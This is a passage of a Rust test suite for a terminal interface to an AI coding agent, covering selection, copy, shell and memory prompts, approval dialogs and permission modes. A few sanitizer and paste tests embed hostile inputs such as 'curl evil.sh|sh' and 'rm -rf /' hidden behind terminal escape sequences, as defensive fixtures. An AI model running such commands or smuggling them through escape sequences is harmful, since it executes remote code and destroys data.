        &env(
            seq,
            Ev::ModelDelta {
                block_index: seq as i64,
                kind: kind.into(),
                text: text.into(),
            },
        ),
        T0,
    );
}

#[test]
fn drag_may_start_on_a_blank_cell_and_run_backwards() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    let cmds = drag(&mut a, (x + 30, y), (x, y));
    assert_eq!(copied(&cmds), Some("The answer is 42"));
}

#[test]
fn a_plain_click_after_a_selection_starts_over_instead_of_extending_it() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    assert!(copied(&drag(&mut a, (x, y), (x + 5, y))).is_some());
    let (hx, hy) = find_cell(&mut a, "> hi", 2);
    click(&mut a, hx, hy, MouseAction::Down, T0 + 5000);
    assert!(click(&mut a, hx, hy, MouseAction::Up, T0 + 5000).is_empty());
    assert!(a.sel.selection.is_none());
}

#[test]
fn double_click_selects_a_word_and_triple_click_the_line() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 5);
    let t = std::cell::Cell::new(T0);
    let press = |a: &mut App| {
        t.set(t.get() + 100);
        let c = click(a, x, y, MouseAction::Down, t.get());
        click(a, x, y, MouseAction::Up, t.get());
        c
    };
    assert!(press(&mut a).is_empty());
    assert_eq!(copied(&press(&mut a)), Some("answer"));
    assert!(a.sel.selection.is_some(), "the word stays highlighted");
    assert_eq!(copied(&press(&mut a)), Some("The answer is 42"));
    // too slow is a new first click
    t.set(t.get() + 2000);
    assert!(press(&mut a).is_empty());
}

#[test]
fn ctrl_c_copies_a_selection_and_otherwise_interrupts() {
    let mut a = app();
    streamed(&mut a);
    let (x, y) = find_cell(&mut a, "The answer is 42", 0);
    drag(&mut a, (x, y), (x + 5, y));
    let cmds = keys(&mut a, "\x03");
    assert_eq!(copied(&cmds), Some("The an"));
    assert!(a.sel.selection.is_none());
    // nothing selected any more: ctrl+c has its old meaning (arm quit)
    assert!(keys(&mut a, "\x03").is_empty());
    assert!(screen(&mut a).contains("press ctrl+c again to quit"));
}

#[test]
fn copied_text_leaves_out_gutters_and_joins_wide_and_wrapped_rows() {
    let mut a = app();
    streamed(&mut a);
    say(&mut a, "thinking", "pondering the weather today", 30);
    say(
        &mut a,
        "text",
        &format!(
            "\n\n{} {}",
            "日本語のテキスト".repeat(12),
            "tail".repeat(40)
        ),
        31,
    );
    let (x, y) = find_cell(&mut a, "pondering", 0);
    let cmds = drag(&mut a, (x, y), (x + 8, y));
    assert_eq!(copied(&cmds), Some("pondering"));
    // from the gutter's own column too: the bar is not text
    let cmds = drag(&mut a, (x - 2, y), (x + 8, y));
    let t = copied(&cmds).expect("copied");
    assert!(!t.contains('│'), "{t:?}");
    // a selection across the wrapped wide-char paragraph keeps every glyph exactly once
    let para = "日本語のテキスト".repeat(12);
    let (wx, wy) = find_cell(&mut a, "日本語", 0);
    let cmds = drag(&mut a, (wx, wy), (COLS - 1, wy + 3));
    let t = copied(&cmds).expect("copied").to_string();
    // wrapped over four screen rows, copied as the one line it is (no indent, no breaks)
    assert!(t.starts_with(&format!("{para} tail")), "{t:?}");
    assert!(!t.contains('\n') && !t.starts_with(' '), "{t:?}");
}

#[test]
fn ctrl_click_opens_urls_and_existing_paths_only() {
    let d = tempfile::tempdir().unwrap();
    let root = synthesis_core::canonicalize(d.path()).unwrap();
    let mut a = App::new(cfg(&root.to_string_lossy()), &[], T0);
    streamed(&mut a);
    a.on_event(
        &env(
            30,
            Ev::Notice {
                level: "info".into(),
                text: format!("docs https://example.com/x and {}", root.display()),
            },
        ),
        T0,
    );
    let lines = a.render(COLS, ROWS, T0);
    let find = |needle: &str| {
        let row = lines
            .iter()
            .position(|l| strip_ansi(l).contains(needle))
            .unwrap();
        let plain = strip_ansi(&lines[row]);
        (
            plain[..plain.find(needle).unwrap()].chars().count() as u32 + 3,
            row as u32 + 1,
        )
    };
    let ctrl = Mods {
        ctrl: true,
        ..Mods::default()
    };
    let (x, y) = find("https://example.com/x");
    let cmds = a.on_key(
        Key::Mouse {
            x,
            y,
            button: 0,
            action: MouseAction::Down,
            mods: ctrl,
        },
        T0,
    );
    assert!(
        matches!(&cmds[..], [Cmd::Open(OpenTarget::Url(u))] if u == "https://example.com/x"),
        "{cmds:?}"
    );
    let (x, y) = find(&root.display().to_string());
    let cmds = a.on_key(
        Key::Mouse {
            x,
            y,
            button: 0,
            action: MouseAction::Down,
            mods: ctrl,
        },
        T0,
    );
    assert!(
        matches!(&cmds[..], [Cmd::Open(OpenTarget::Folder(p))] if *p == root),
        "{cmds:?}"
    );
    // without ctrl nothing opens
    let (x, y) = find("https://example.com/x");
    assert!(
        a.on_key(
            Key::Mouse {
                x,
                y,
                button: 0,
                action: MouseAction::Down,
                mods: Mods::default()
            },
            T0
        )
        .is_empty()
    );
}

#[test]
fn startup_notice_is_shown_once_and_only_for_the_same_severity() {
    let mut a = app();
    a.startup_notes(&["dupnote".to_string()]);
    let count = |a: &mut App| screen(a).matches("dupnote").count();
    let notice = |a: &mut App, seq: u64, level: &str| {
        a.on_event(
            &env(
                seq,
                Ev::Notice {
                    level: level.into(),
                    text: "dupnote".into(),
                },
            ),
            T0,
        )
    };
    assert_eq!(count(&mut a), 1, "the startup note itself");
    notice(&mut a, 1, "error"); // same text, other severity: a distinct event, shown
    assert_eq!(count(&mut a), 2);
    notice(&mut a, 2, "warning"); // the event the startup note stands for: not shown again
    assert_eq!(count(&mut a), 2);
    notice(&mut a, 3, "warning"); // a real later one is shown
    assert_eq!(count(&mut a), 3);
}

#[test]
fn wheel_scrolls_the_chat_only_inside_it() {
    let mut a = app();
    for i in 0..60 {
        a.on_event(
            &env(
                i + 1,
                Ev::Notice {
                    level: "info".into(),
                    text: format!("note number {i}"),
                },
            ),
            T0,
        );
    }
    a.render(COLS, ROWS, T0);
    let rect = a.frame.as_ref().unwrap().rects.chat_rect.unwrap();
    let wheel = |x: i64, y: i64| Key::Wheel {
        dir: WheelDir::Up,
        x: x as u32 + 1,
        y: y as u32 + 1,
        mods: Mods::default(),
    };
    a.on_key(wheel(rect.x + 5, rect.y + 5), T0);
    assert_eq!(a.scroll, WHEEL_LINES);
    a.on_key(wheel(0, 0), T0); // the sidebar / header
    assert_eq!(a.scroll, WHEEL_LINES);
    keys(&mut a, "\x1b[6~"); // pagedown
    assert_eq!(a.scroll, 0);
}

#[test]
fn ctrl_l_asks_for_a_screen_reset() {
    let mut a = app();
    assert!(matches!(&keys(&mut a, "\x0c")[..], [Cmd::ResetScreen]));
}

#[test]
fn replayed_session_shows_its_history_and_is_idle() {
    let evs = [
        env(
            1,
            Ev::UserMessage {
                text: "old question".into(),
                display_text: None,
                images: vec![],
            },
        ),
        env(
            2,
            Ev::TaskStarted {
                request: "old question".into(),
                acceptance_criteria: vec![],
                budget: Budget::default(),
            },
        ),
    ];
    let mut a = App::new(cfg("/tmp/proj"), &evs, T0);
    let s = screen(&mut a);
    assert!(s.contains("old question"), "{s}");
    assert!(!a.running() && a.chat.agent.status == "idle");
}

#[test]
fn animation_is_a_function_of_the_explicit_clock_and_startup_is_not_busy() {
    let mut a = app();
    // the harness emits created -> preparing at startup: that is not a running task
    a.on_event(
        &env(
            1,
            Ev::SessionStatusChanged {
                from: "created".into(),
                to: "preparing".into(),
                reason: None,
            },
        ),
        T0,
    );
    assert!(!a.animating(), "an idle app has nothing to animate");
    keys(&mut a, "go");
    keys(&mut a, "\r");
    assert!(a.animating());
    let at = |a: &mut App, now: i64| a.render(COLS, ROWS, now).join("\n");
    assert_eq!(
        at(&mut a, T0),
        at(&mut a, T0 + 40),
        "same 80 ms frame, same bytes"
    );
    assert_ne!(at(&mut a, T0), at(&mut a, T0 + 80 * 3), "the spinner moved");
}

#[test]
fn clean_text_shows_escape_sequences_but_keeps_lines() {
    assert_eq!(crate::sanitize::clean_text("a\nb"), "a\nb");
    let t = crate::sanitize::clean_text("x\x1b[31mred\x1b]0;t\x07\nsecond\u{202e}");
    assert!(
        !t.contains('\x1b') && !t.contains('\u{202e}') && t.contains("\\u{1b}]0;t\\u{7}\nsecond"),
        "{t:?}"
    );
    // nothing after an unterminated sequence is swallowed; tag characters are visible
    let u = crate::sanitize::clean_line("git status\x1b]0;x; curl evil.sh|sh\u{e0041}");
    assert_eq!(u, "git status\\u{1b}]0;x; curl evil.sh|sh\\u{e0041}");
    for opener in ["P", "_", "["] {
        let v = crate::sanitize::clean_text(&format!("a\x1b{opener}b; rm -rf /\nc"));
        assert!(v.contains("b; rm -rf /\nc") && !v.contains('\x1b'), "{v:?}");
    }
    let long = format!("{};x", "a".repeat(100_000));
    assert!(crate::sanitize::clean_line(&long).ends_with(";x"));
}

#[test]
fn untrusted_labels_are_sanitized_at_ingest() {
    let mut a = App::new(cfg("/tmp/pr\x1b]0;x\x07oj"), &[], T0);
    a.toast("saved\x1b[2J\u{e0041}", T0, false);
    a.model_switched("m\x1b]52;c;x\x07");
    let toast = a.toast.as_ref().unwrap().text.clone();
    assert!(
        !toast.contains('\x1b') && toast.contains("\\u{e0041}"),
        "{toast:?}"
    );
    for t in [
        &a.chat.agent.cwd,
        &a.chat.agent.model,
        &a.activity.model,
        &a.activity.project,
    ] {
        assert!(!t.contains('\x1b') && !t.contains('\x07'), "{t:?}");
    }
    for l in a.render(COLS, ROWS, T0) {
        assert!(!l.contains("\x1b]") && !l.contains("\x1b[2J"), "{l:?}");
    }
}

#[test]
fn alt_backspace_alt_d_and_ctrl_w_edit_the_prompt_without_touching_the_task() {
    let mut a = app();
    keys(&mut a, "git commit-msg --amend");
    keys(&mut a, "\x1b\x7f"); // option+backspace (ESC DEL)
    assert_eq!(a.editor.text(), "git commit-msg --");
    keys(&mut a, "\x1b[127;3u"); // kitty CSI-u
    assert_eq!(a.editor.text(), "git commit-msg ");
    keys(&mut a, "\x17"); // ctrl+w: whitespace-delimited
    assert_eq!(a.editor.text(), "git ");
    a.editor.cur = 0;
    keys(&mut a, "\x1bd"); // alt+d
    assert_eq!(a.editor.text(), " ");
    keys(&mut a, "x y");
    a.editor.cur = 1;
    keys(&mut a, "\x1b[3;3~"); // alt+delete: forward, skips the space, takes "y"
    assert_eq!(a.editor.text(), "x ");
    // while a task runs the same keys must not be read as Esc (which would cancel it)
    keys(&mut a, "\r");
    assert!(a.running());
    let token = a.task.as_ref().unwrap().cancel.clone();
    keys(&mut a, "more words");
    keys(&mut a, "\x1b\x7f\x1bd");
    assert!(!token.is_cancelled());
    assert!(!a.chat.agent.interrupting);
}

#[test]
fn ctrl_o_toggles_expanded_even_while_running_or_in_a_dialog_and_the_hint_follows() {
    let mut a = app();
    assert!(screen(&mut a).contains("ctrl+o: expand"));
    keys(&mut a, "\x0f");
    assert!(a.expanded);
    assert!(screen(&mut a).contains("ctrl+o: collapse"));
    keys(&mut a, "go\r"); // a running task
    keys(&mut a, "\x0f");
    assert!(!a.expanded);
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    keys(&mut a, "\x0f"); // over a dialog: toggles, answers nothing
    assert!(a.expanded);
    assert!(rx.try_recv().is_err());
    assert_eq!(a.dialogs.len(), 1);
}

/// 1-based terminal cell of `needle` on the last rendered screen.
fn cell(a: &mut App, needle: &str) -> (u32, u32) {
    for (y, l) in a.render(COLS, ROWS, T0).iter().enumerate() {
        let l = strip_ansi(l);
        if let Some(i) = l.find(needle) {
            return (l[..i].chars().count() as u32 + 1, y as u32 + 1);
        }
    }
    panic!("{needle:?} not on screen");
}

fn right_click(a: &mut App, x: u32, y: u32) -> Vec<Cmd> {
    a.on_key(
        Key::Mouse {
            x,
            y,
            button: 2,
            action: MouseAction::Down,
            mods: Mods::default(),
        },
        T0,
    )
}

#[test]
fn right_click_in_the_prompt_asks_for_a_paste_and_pasting_never_submits() {
    let mut a = app();
    let (x, y) = cell(&mut a, "Enter send");
    assert!(matches!(
        &right_click(&mut a, x, y)[..],
        [Cmd::PasteClipboard]
    ));
    // the host answers with the clipboard text: multi-line, inserted at the cursor, no submit
    keys(&mut a, "ab");
    a.editor.left();
    a.paste_clipboard("one\r\ntwo\x1b[31m\u{202e}\nthree", T0 + 1);
    assert_eq!(a.editor.text(), "aone\ntwo[31m\nthreeb");
    assert!(!a.running(), "pasted newlines must not submit");
    assert!(a.editor.multiline());
    // the paste-activity signal fired: a dialog opening now stays unarmed for a moment
    assert!(a.paste_quiet_until > T0);
    a.paste_clipboard("", T0 + 2);
    assert!(screen_at(&mut a, T0 + 2).contains("clipboard is empty"));
    // 5 MiB of clipboard: capped by the prompt limit, nothing inserted, prompt intact
    let before = a.editor.text();
    a.paste_clipboard(&"x".repeat(5 << 20), T0 + 3);
    assert_eq!(a.editor.text(), before);
    assert!(screen_at(&mut a, T0 + 3).contains("paste is too large"));
}

#[test]
fn right_click_outside_the_prompt_or_over_a_dialog_or_picker_does_nothing() {
    let mut a = app();
    let (px, py) = cell(&mut a, "Enter send");
    let rect = a.frame.as_ref().unwrap().rects.chat_rect.unwrap();
    assert!(right_click(&mut a, 1, 1).is_empty(), "header");
    assert!(
        right_click(&mut a, rect.x as u32 + 3, rect.y as u32 + 1).is_empty(),
        "message area"
    );
    keys(&mut a, "\x10"); // ctrl+p: command picker owns the keyboard
    assert!(right_click(&mut a, px, py).is_empty());
    keys(&mut a, "\x1b");

    let mut a = app();
    let (px, py) = cell(&mut a, "Enter send");
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0 - 10 * ARM_MS); // armed
    a.render(COLS, ROWS, T0);
    for (x, y) in [(px, py), (px, py + 3), (5, ROWS - 3)] {
        assert!(right_click(&mut a, x, y).is_empty());
    }
    assert!(rx.try_recv().is_err(), "a right click answers nothing");
    assert_eq!(a.dialogs.len(), 1);
    // even a clipboard answer that arrives late is not typed into the dialog's prompt
    assert_eq!(a.editor.text(), "");
}

#[test]
fn compact_command_asks_the_host_and_blocks_new_tasks_while_it_runs() {
    let mut a = app();
    assert!(matches!(
        &keys(&mut a, "/compact\r")[..],
        [Cmd::Compact { instructions: None }]
    ));
    let cmds = keys(&mut a, "/compact keep the API notes\r");
    assert!(
        matches!(&cmds[..], [Cmd::Compact { instructions: Some(i) }] if i == "keep the API notes")
    );
    a.compact_started(T0);
    assert!(keys(&mut a, "hello\r").is_empty());
    assert!(screen(&mut a).contains("compacting the conversation"));
    a.compact_done();
    assert!(matches!(&keys(&mut a, "\r")[..], [Cmd::StartTask { .. }]));
}

#[test]
fn context_events_drive_the_status_line() {
    let mut a = app();
    let status = |a: &mut App| screen(a).lines().last().unwrap_or_default().to_string();
    assert!(!status(&mut a).contains("ctx "));
    a.on_event(
        &env(
            1,
            Ev::ContextUsage {
                used_tokens: 124_000,
                window_tokens: 200_000,
                percent: 62.0,
                source: "provider".into(),
                stale: false,
            },
        ),
        T0,
    );
    assert!(
        status(&mut a).contains("ctx 62% 124k/200k"),
        "{}",
        status(&mut a)
    );
    a.on_event(
        &env(
            2,
            Ev::ContextCompacting {
                reason: "auto".into(),
                used_tokens: 168_000,
                window_tokens: 200_000,
            },
        ),
        T0,
    );
    assert!(status(&mut a).contains("⟳ compacting…"));
    a.on_event(
        &env(
            3,
            Ev::ContextUsage {
                used_tokens: 41_000,
                window_tokens: 200_000,
                percent: 20.5,
                source: "estimate".into(),
                stale: false,
            },
        ),
        T0,
    );
    assert!(status(&mut a).contains("ctx 21% 41k/200k"));
}

// ---- `!` shell prompt -------------------------------------------------------------------

#[test]
fn typed_bang_enters_the_shell_prompt_and_enter_runs_the_command() {
    let mut a = app();
    keys(&mut a, "!");
    assert!(a.bash());
    assert!(screen(&mut a).contains("! bash mode"));
    // `?` is a character here, not /help; suggestions stay off
    keys(&mut a, "echo hi?");
    assert_eq!(a.editor.text(), "!echo hi?");
    assert!(!screen(&mut a).contains("commands and keys"));
    keys(&mut a, "\x7f"); // drop the `?`
    let cmds = keys(&mut a, "\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: false, .. }] if command == "echo hi"),
        "{cmds:?}"
    );
    assert!(a.task_running(), "Esc and ctrl+c cancel it like a task");
    assert_eq!(
        a.editor.history.last().map(String::as_str),
        Some("!echo hi")
    );
    // busy: a second one is queued, not run
    keys(&mut a, "!");
    assert!(keys(&mut a, "ls\r").is_empty());
    assert_eq!(a.queue, ["!ls"]);
}

#[test]
fn double_bang_only_records() {
    let mut a = app();
    keys(&mut a, "!");
    let cmds = keys(&mut a, "!echo hi\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, record_only: true, .. }] if command == "echo hi"),
        "{cmds:?}"
    );
}

#[test]
fn only_a_typed_bang_makes_a_shell_command() {
    let mut a = app();
    // a paste, or a burst of characters, that starts with `!` is plain text
    keys(&mut a, "\x1b[200~!rm -rf x\x1b[201~");
    assert!(!a.bash(), "{:?}", a.editor.text());
    assert!(matches!(&keys(&mut a, "\r")[..], [Cmd::StartTask { .. }]));
    let mut a = app();
    a.on_key(Key::Text("!ls".into()), T0);
    assert!(!a.bash());
    // `!` in the middle of text is just a character
    let mut a = app();
    keys(&mut a, "hello!");
    assert!(!a.bash());
}

#[test]
fn escape_and_backspace_leave_the_shell_prompt_and_esc_cancels_a_running_command() {
    let mut a = app();
    keys(&mut a, "!");
    keys(&mut a, "ls");
    keys(&mut a, "\x1b");
    assert!(!a.bash() && a.editor.text().is_empty());
    keys(&mut a, "!");
    keys(&mut a, "\x7f");
    assert!(!a.bash());
    // a running command: Esc cancels it first and the prompt keeps its text
    keys(&mut a, "!");
    keys(&mut a, "sleep 9\r");
    keys(&mut a, "!");
    assert!(a.bash());
    keys(&mut a, "\x1b");
    assert!(
        a.task.as_ref().unwrap().cancelling,
        "esc cancelled the command"
    );
    assert!(a.bash(), "the draft stays");
    a.command_done(None);
    assert!(!a.task_running());
}

#[test]
fn slash_in_the_shell_prompt_is_a_path_not_a_command() {
    let mut a = app();
    keys(&mut a, "!");
    let cmds = keys(&mut a, "/bin/echo x\r");
    assert!(
        matches!(&cmds[..], [Cmd::UserCommand { command, .. }] if command == "/bin/echo x"),
        "{cmds:?}"
    );
}

#[test]
fn ctrl_u_after_a_paste_clears_the_prompt() {
    let mut a = app();
    keys(&mut a, "\x1b[200~!echo pasted\x1b[201~");
    keys(&mut a, "\x15");
    assert_eq!(a.editor.text(), "", "cursor {}", a.editor.cur);
}

#[test]
fn shift_tab_visits_every_mode_once_per_press_including_past_the_bypass_dialog() {
    let mut a = app();
    let mut seen = vec![];
    for _ in 0..10 {
        keys(&mut a, "\x1b[Z");
        seen.push(if a.picker.is_some() {
            "bypass?"
        } else {
            mode_str(a.mode)
        });
    }
    assert_eq!(
        seen,
        [
            "acceptEdits",
            "plan",
            "auto",
            "bypass?",
            "default",
            "acceptEdits",
            "plan",
            "auto",
            "bypass?",
            "default"
        ]
    );
}

#[test]
fn edit_approval_shows_a_numbered_hunk_not_an_escaped_one_liner() {
    let d = tempfile::tempdir().unwrap();
    let cwd = d.path().canonicalize().unwrap();
    std::fs::write(cwd.join("f.txt"), "a\nb\nc\nd\n").unwrap();
    let mut a = App::new(cfg(cwd.to_str().unwrap()), &[], T0);
    let (ask, _rx) = ask(
        "Edit",
        json!({"file_path": "f.txt", "old_string": "b\nc", "new_string": "B\nc"}),
        vec![],
    );
    a.on_approval(ask, T0);
    let s = screen_at(&mut a, T0 + 1000);
    assert!(!s.contains("\\n"), "no escaped newlines:\n{s}");
    assert!(s.contains("+1 −1") || s.contains("+1 -1"), "{s}");
    assert!(
        s.contains("2") && s.contains("− b") && s.contains("+ B"),
        "{s}"
    );
}

#[test]
fn clicking_an_option_in_an_approval_dialog_answers_it_once_armed() {
    let mut a = app();
    let (q, mut rx) = ask("Bash", json!({"command": "ls"}), vec![]);
    a.on_approval(q, T0);
    let _ = a.render(COLS, ROWS, T0);
    let (x, y) = find_cell(&mut a, "2. No", 0);
    click(&mut a, x, y, MouseAction::Down, T0 + 10);
    assert!(
        rx.try_recv().is_err(),
        "ignored while the dialog is still arming"
    );
    let _ = a.render(COLS, ROWS, T0 + 1000);
    click(&mut a, x, y, MouseAction::Down, T0 + 1000);
    let ans = rx.try_recv().expect("the click answered");
    assert_eq!(ans.decision, ApprovalDecision::Deny);
    assert!(a.dialogs.is_empty());
}

#[test]
fn compacting_shows_a_working_line_and_errors_are_sentences_not_debug() {
    let mut a = app();
    a.compact_started(T0);
    let s = screen_at(&mut a, T0 + 3000);
    assert!(s.contains("Compacting") && s.contains("3s"), "{s}");
    assert!(
        !s.contains("esc to interrupt"),
        "compaction cannot be interrupted: {s}"
    );
    a.compact_done();
    assert!(!screen_at(&mut a, T0 + 3000).contains("Compacting"));
    for e in ["NoProgress { before: 3, after: 11 }", "Nothing"] {
        let (t, tone) = crate::chat::friendly_compact_error(e);
        assert!(t.starts_with("nothing to compact") && tone == "warn", "{t}");
    }
    let (t, _) = crate::chat::friendly_compact_error("Summarizer(Provider(\"boom\"))");
    assert!(!t.contains("Summarizer("), "{t}");
}

#[test]
fn header_status_panel_and_footer_share_one_context_meter_and_clear_resets_it() {
    let mut a = app();
    a.on_event(
        &env(
            1,
            Ev::ContextUsage {
                used_tokens: 100_000,
                window_tokens: 200_000,
                percent: 50.0,
                source: "provider".into(),
                stale: false,
            },
        ),
        T0,
    );
    let s = screen(&mut a);
    let head = s.lines().next().unwrap();
    assert!(head.contains("ctx") && head.contains("50%"), "{head}");
    assert!(
        s.contains("100.0k/200.0k") || s.contains("100k/200k"),
        "{s}"
    );
    assert!(s.lines().last().unwrap().contains("ctx 50% 100k/200k"));
    keys(&mut a, "/clear\r");
    let s = screen(&mut a);
    assert!(s.lines().next().unwrap().contains("0%"), "{s}");
    assert!(!s.lines().last().unwrap().contains("ctx 50%"), "{s}");
}

#[test]
fn welcome_box_shows_the_folder() {
    let mut a = app();
    let s = screen(&mut a);
    assert!(s.contains("cwd: /tmp/proj"), "{s}");
    let long = format!("/tmp/{}/repo", "d".repeat(150));
    let mut b = App::new(cfg(&long), &[], T0);
    let s = screen(&mut b);
    assert!(
        s.contains("cwd: …") && s.contains("/repo"),
        "long paths keep their end: {s}"
    );
}

#[test]
fn new_slash_commands_ask_the_host_and_status_has_no_debug_output() {
    let mut a = app();
    assert!(matches!(
        &keys(&mut a, "/mcp\r")[..],
        [Cmd::Info(Info::Mcp)]
    ));
    assert!(matches!(
        &keys(&mut a, "/agents\r")[..],
        [Cmd::Info(Info::Agents)]
    ));
    assert!(matches!(
        &keys(&mut a, "/permissions\r")[..],
        [Cmd::Info(Info::Permissions(PermAction::List))]
    ));
    let c = keys(&mut a, "/permissions allow Bash(git status:*)\r");
    assert!(
        matches!(&c[..], [Cmd::Info(Info::Permissions(PermAction::Allow(r)))] if r == "Bash(git status:*)")
    );
    let c = keys(&mut a, "/permissions remove Bash(git status:*)\r");
    assert!(matches!(
        &c[..],
        [Cmd::Info(Info::Permissions(PermAction::Remove(_)))]
    ));
    assert!(keys(&mut a, "/permissions allow\r").is_empty());
    assert!(screen(&mut a).contains("usage: /permissions"));
    keys(&mut a, "/status\r");
    let s = screen(&mut a);
    assert!(s.contains("mode") && s.contains("manual"), "{s}");
    assert!(!s.contains("SandboxStatus") && !s.contains("{ mode"), "{s}");
}

#[test]
fn resume_picker_lists_this_folder_first_with_the_prompt_and_age() {
    let mut c = cfg("/tmp/proj");
    let mk = |id: &str, cwd: &str, title: &str, mtime: i64| SavedSession {
        id: id.into(),
        cwd: cwd.into(),
        title: title.into(),
        updated_at: "2026-01-01T00:00:00Z".into(),
        mtime,
    };
    c.saved = vec![
        mk(
            "aaaaaaaa1",
            "/tmp/proj",
            "fix the parser",
            T0 - 3 * 3_600_000,
        ),
        mk("bbbbbbbb2", "/elsewhere", "other folder work", T0 - 60_000),
    ];
    let mut a = App::new(c, &[], T0);
    keys(&mut a, "/resume\r");
    let s = screen(&mut a);
    assert!(s.contains("fix the parser") && s.contains("3h ago"), "{s}");
    assert!(!s.contains("other folder work"), "{s}");
    assert!(s.contains("show sessions from all folders"), "{s}");
    keys(&mut a, "\x1b[B");
    keys(&mut a, "\r");
    let s = screen(&mut a);
    assert!(
        s.contains("other folder work") && s.contains("/elsewhere"),
        "{s}"
    );
}

#[test]
fn a_big_paste_is_a_chip_that_expands_when_sent() {
    let mut a = app();
    let big = (1..=300)
        .map(|i| format!("line {i}"))
        .collect::<Vec<_>>()
        .join("\n");
    a.on_key(Key::Paste(big.clone()), T0);
    assert_eq!(a.editor.text(), "[Pasted text #1 +300 lines]");
    keys(&mut a, "see ");
    let cmds = keys(&mut a, "\r");
    assert!(matches!(&cmds[..], [Cmd::StartTask { text, .. }] if *text == format!("{big}see ")));
}

#[test]
fn modify_other_keys_shift_enter_makes_a_newline() {
    let mut a = app();
    keys(&mut a, "a");
    keys(&mut a, "\x1b[27;2;13~");
    keys(&mut a, "b");
    assert_eq!(a.editor.text(), "a\nb");
}

#[test]
fn bypass_confirmation_has_no_filter_line() {
    let mut a = app();
    for _ in 0..4 {
        keys(&mut a, "\x1b[Z");
    }
    let s = screen(&mut a);
    assert!(
        s.contains("Bypass permissions?") && !s.contains("filter:"),
        "{s}"
    );
}

#[test]
fn effort_cycles_with_alt_t_and_shows_in_the_footer() {
    let mut a = app();
    assert!(screen(&mut a).contains("effort: auto"));
    for want in ["low", "medium", "high"] {
        let cmds = keys(&mut a, "\x1bt");
        assert!(
            matches!(&cmds[..], [Cmd::SetEffort(Some(e))] if e == want),
            "{cmds:?}"
        );
        assert!(screen(&mut a).contains(&format!("effort: {want}")));
    }
    let cmds = keys(&mut a, "\x1bt");
    assert!(matches!(&cmds[..], [Cmd::SetEffort(None)]), "{cmds:?}");
    let cmds = keys(&mut a, "/effort high\r");
    assert!(matches!(&cmds[..], [Cmd::SetEffort(Some(e))] if e == "high"));
    let cmds = keys(&mut a, "/effort bogus\r");
    assert!(cmds.is_empty() && screen(&mut a).contains("usage: /effort"));
}

#[test]
fn hardware_caret_follows_the_prompt_caret() {
    let mut a = app();
    keys(&mut a, "abc");
    a.render(COLS, ROWS, T0);
    let (x0, y0) = a.caret().expect("prompt shown");
    keys(&mut a, "d");
    a.render(COLS, ROWS, T0);
    assert_eq!(a.caret(), Some((x0 + 1, y0)));
    // the cell left of the caret holds the last typed char
    let lines = a.render(COLS, ROWS, T0);
    let row: Vec<char> = strip_ansi(&lines[y0 as usize]).chars().collect();
    let x = (x0 + 1) as usize;
    assert_eq!(row[x - 2..x], ['c', 'd'], "{row:?}");
}

// ---- `#` memory prompt ------------------------------------------------------------------

fn with_memory_files() -> App {
    let mut a = app();
    a.set_memory_files(
        "/home/u/.synthesis/SYNTHESIS.md".into(),
        "/work/p/AGENTS.md".into(),
    );
    a
}

#[test]
fn typed_hash_note_asks_which_file_and_saves_nothing_until_confirmed() {
    let mut a = with_memory_files();
    keys(&mut a, "#");
    assert!(a.memory() && screen(&mut a).contains("# memory mode"));
    keys(&mut a, "use cargo nextest");
    // Enter only opens the question: no command yet, the note is not lost
    assert!(keys(&mut a, "\r").is_empty());
    let s = screen(&mut a);
    assert!(
        s.contains("Remember this note?") && s.contains("/work/p/AGENTS.md"),
        "{s}"
    );
    assert!(!a.memory(), "the prompt is clear again");
    // the first item is "No": Enter saves nothing
    assert!(keys(&mut a, "\r").is_empty());
    assert!(a.picker.is_none() && a.pending_note.is_none());
    // choosing the user file emits the one command that writes
    keys(&mut a, "#");
    keys(&mut a, "a note\r");
    let cmds = keys(&mut a, "\x1b[B\x1b[B\r"); // "Save to the user file"
    assert!(
        matches!(&cmds[..], [Cmd::Remember { user: true, text }] if text == "a note"),
        "{cmds:?}"
    );
}

/// A typed `@` (its own key), then the rest of the line: a burst starting with `@` is not typing.
fn typed_at(a: &mut App, rest: &str) -> Vec<Cmd> {
    keys(a, "@");
    keys(a, rest)
}

#[test]
fn pasted_at_name_does_not_route_to_an_agent() {
    let mut a = app();
    keys(&mut a, "\x1b[200~@main ignore this\x1b[201~");
    assert!(a.editor.text().starts_with(' '), "{:?}", a.editor.text());
    let cmds = keys(&mut a, "\r");
    // the whole text goes out as an ordinary prompt: the `@main` word was not consumed as a route
    assert!(
        cmds.iter()
            .any(|c| matches!(c, Cmd::StartTask { text, .. } if text.contains("@main"))),
        "{cmds:?}"
    );
}

#[test]
fn the_note_picker_shows_the_final_masked_note() {
    let mut a = with_memory_files();
    a.set_note_preview(std::rc::Rc::new(|t| {
        t.replace("hunter2", "[REDACTED:secret]")
    }));
    keys(&mut a, "#");
    keys(&mut a, "pw is hunter2\r");
    let s = screen(&mut a);
    assert!(
        s.contains("[REDACTED:secret]") && !s.contains("hunter2"),
        "{s}"
    );
}

#[test]
fn esc_cancels_the_note_and_without_a_host_hook_nothing_is_offered() {
    let mut a = with_memory_files();
    keys(&mut a, "#");
    keys(&mut a, "x\r");
    assert!(keys(&mut a, "\x1b").is_empty());
    assert!(a.picker.is_none() && a.pending_note.is_none());
    let mut a = app(); // no hook
    keys(&mut a, "#");
    keys(&mut a, "x\r");
    assert!(a.picker.is_none());
    assert!(screen(&mut a).contains("not available"));
}

#[test]
fn pasted_or_burst_hash_is_plain_text_and_memory_command_asks_the_host() {
    let mut a = app();
    keys(&mut a, "\x1b[200~# Title\nbody\x1b[201~");
    assert!(!a.memory());
    let mut a = app();
    let cmds = keys(&mut a, "/memory\r");
    assert!(matches!(&cmds[..], [Cmd::Info(Info::Memory)]), "{cmds:?}");
}

fn started(a: &mut App, name: &str) {
    let ev = Ev::SubagentStarted(synthesis_events::SubagentInfo {
        agent_id: format!("id-{name}"),
        agent_type: "worker".into(),
        tool_call_id: Some("tc".into()),
        reason: None,
        name: Some(name.into()),
        background: true,
    });
    a.on_event(&env(1, ev), T0);
}

